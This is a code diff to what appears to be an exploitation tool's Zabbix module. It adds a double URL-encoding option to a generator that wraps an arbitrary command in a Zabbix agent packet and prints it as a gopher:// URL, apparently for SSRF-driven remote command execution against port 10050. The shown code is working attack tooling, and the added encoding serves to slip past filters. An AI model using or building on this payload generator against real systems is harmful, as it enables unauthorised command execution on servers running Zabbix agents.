@@ -6,6 +6,7 @@ class Zabbix:
         parser = subparsers.add_parser("zabbix", help="zabbix exploitation")
         parser.add_argument("-t", "--target", help="Target", default="127.0.0.1:10050")
         parser.add_argument("-c", "--command", required=True, help="Command")
+        parser.add_argument("--double-encode", action='store_true', help="Double URL encode",)
         parser.set_defaults(run=self.run)
 
     def make_package(self, command: str) -> bytes:
@@ -27,5 +28,8 @@ class Zabbix:
     def run(self, args) -> str:
         zabbix_package = self.make_package(args.command)
         payload = self.encode(zabbix_package)
+
+        if args.double_encode:
+            payload = self.encode(payload.encode())
 
         print(f"gopher://{args.target}/_{payload}")
